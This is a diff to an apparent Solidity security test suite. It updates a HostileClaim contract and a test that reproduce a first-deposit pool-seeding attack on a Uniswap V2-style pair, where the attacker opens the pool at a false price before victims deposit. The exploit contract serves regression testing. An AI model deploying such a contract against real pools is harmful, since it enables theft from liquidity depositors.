@@ -23,12 +23,15 @@ contract HostileClaim {
     UniswapV2Factory immutable factory;
     WBLCH immutable wrapped;
     TestToken immutable usdc;
+    /// Token base units sent against 1e12 wei of the native coin (2e12 for an 18-decimal token: 1 native = 2).
+    uint256 immutable tokenDust;
 
-    constructor(UniswapV2Factory _factory, WBLCH _wrapped, TestToken _usdc) {
+    constructor(UniswapV2Factory _factory, WBLCH _wrapped, TestToken _usdc, uint256 _tokenDust) {
         attacker = msg.sender;
         factory = _factory;
         wrapped = _wrapped;
         usdc = _usdc;
+        tokenDust = _tokenDust;
     }
 
     receive() external payable {}
@@ -39,7 +42,7 @@ contract HostileClaim {
         if (pair == address(0)) pair = factory.createPair(address(wrapped), address(usdc));
         wrapped.deposit{value: 1e12}();
         wrapped.transfer(pair, 1e12);
-        usdc.transfer(pair, 2e12);
+        usdc.transfer(pair, tokenDust);
         UniswapV2Pair(pair).mint(attacker);
     }
 }
@@ -145,7 +148,7 @@ contract R328FirstDepositTest is TestBase {
     /// tokens. The attacker buys the native side for 600: the loss of R309-MC-1, through the package's own tool.
     function test_R328_1_originOfTheDepositorOpensThePool_thenAddDepositsAtTheFalsePrice() public {
         ovm.startPrank(ATTACKER, ATTACKER);
-        HostileClaim hostile = new HostileClaim(factory, wrapped, usdc);
+        HostileClaim hostile = new HostileClaim(factory, wrapped, usdc, 2e12);
         payable(address(hostile)).transfer(1e12);
         usdc.transfer(address(hostile), 2e12);
         vm.stopPrank();
